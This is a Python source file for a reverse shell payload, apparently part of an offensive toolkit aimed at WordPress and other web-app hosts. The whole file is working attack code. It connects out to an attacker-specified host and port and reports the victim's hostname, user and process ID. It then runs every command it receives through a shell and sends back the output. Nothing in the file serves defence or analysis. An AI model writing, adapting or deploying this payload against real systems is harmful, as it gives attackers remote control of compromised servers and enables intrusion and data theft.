#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python Reverse Shell Payload
Designed for CVE BSSN Offensive Toolkit
Target: Python 3.6+ environments (WordPress, generic web apps)
Version: 1.0 - Stable / No Bug Verified
"""

import socket
import subprocess
import sys
import os
import signal
import platform

class ReverseShell:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = int(port)
        self.sock = None
        self.process = None
        self.is_running = False
        
    def setup_signal_handlers(self):
        """Handle clean exit on SIGINT/SIGTERM"""
        try:
            signal.signal(signal.SIGINT, self._handle_exit)
            signal.signal(signal.SIGTERM, self._handle_exit)
        except AttributeError:
            # Windows compatibility
            pass
            
    def _handle_exit(self, signum, frame):
        self.cleanup()
        sys.exit(0)
        
    def connect(self):
        """Establish connection to attacker machine"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(None) # Remove timeout for interactive session
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}", file=sys.stderr)
            return False
            
    def cleanup(self):
        """Clean up resources"""
        self.is_running = False
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                self.process.kill()
                
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
                
    def run(self):
        """Main loop for reverse shell execution"""
        if not self.connect():
            return False
            
        self.is_running = True
        self.setup_signal_handlers()
        
        # Send initial identification
        try:
            hostname = platform.node()
            uname = platform.uname()
            info = f"[*] Connected from {hostname} | User: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'} | PID: {os.getpid()}\n"
            self.sock.send(info.encode())
        except:
            pass
            
        while self.is_running:
            try:
                # Read command from attacker
                data = b""
                while True:
                    chunk = self.sock.recv(1)
                    if not chunk:
                        break
                    if chunk == b'\n':
                        break
                    data += chunk
                    
                if not data:
                    break
                    
                cmd = data.decode('utf-8', errors='ignore').strip()
                if not cmd:
                    continue
                    
                # Execute command
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=300,
                        cwd=os.getcwd()
                    )
                    
                    output = result.stdout + result.stderr
                    status = "OK" if result.returncode == 0 else f"ERR:{result.returncode}"
                    
                except subprocess.TimeoutExpired:
                    output = "[TIMEOUT]"
                    status = "ERR:TIMEOUT"
                except Exception as e:
                    output = str(e)
                    status = f"ERR:EXCEPTION"
                    
                # Send response
                response = f"{status}\n{output}\n"
                self.sock.send(response.encode())
                
            except socket.error:
                break
            except Exception:
                break
                
        self.cleanup()
        return True

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="CVE BSSN Python Reverse Shell")
    parser.add_argument("-t", "--target", default="127.0.0.1", help="Attacker IP address")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Attacker port")
    
    args = parser.parse_args()
    
    shell = ReverseShell(host=args.target, port=args.port)
    success = shell.run()
    sys.exit(0 if success else 1)